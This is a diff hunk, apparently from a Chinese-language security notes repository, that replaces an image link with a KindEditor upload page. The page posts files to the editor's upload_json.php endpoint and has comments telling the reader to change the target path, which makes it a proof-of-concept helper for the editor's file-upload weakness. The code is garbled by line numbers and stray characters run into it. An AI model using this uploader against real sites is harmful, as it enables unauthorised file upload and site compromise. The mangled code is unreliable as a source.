@@ -182,7 +182,7 @@ https://mp.weixin.qq.com/s/k1hRg7cmRwwJJyyX04Ipmg
 
 ![image-20260205202108245](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260205202108245.png)
 
-![image-20260205202115670](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260205202115670.png)
+xxxxxxxxxx49 1<html>2<head>3​4    <title>Uploader</title>5​6    // 修改路径7    <script src="http://localhost/kindeditor/kindeditor.js"></script>8​9    <script>10​11        KindEditor.ready(function (K) {12​13            var uploadbutton = K.uploadbutton({14​15                button: K('#uploadButton')[0],16                fieldName: 'imgFile',17                // 修改路径18                url: 'http://localhost/kindeditor/php/upload_json.php?dir=file',19                afterUpload: function (data) {20                    if (data.error === 0) {21                        var url = K.formatUrl(data.url, 'absolute');22                        K('#url').val(url);23                    }24                },25            });26​27            uploadbutton.fileBox.change(function (e) {28​29                uploadbutton.submit();30​31            });32​33        });34​35    </script>36</head>37<body>38​39<div class="upload">40​41    <input class="ke-input-text" type="text" id="url" value="" readonly=“readonly”/>42​43    <input type="button" id="uploadButton" value="Upload"/>44​45</div>46​47</body>48​49</html>html
 
 ![image-20260205202146225](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260205202146225.png)
 
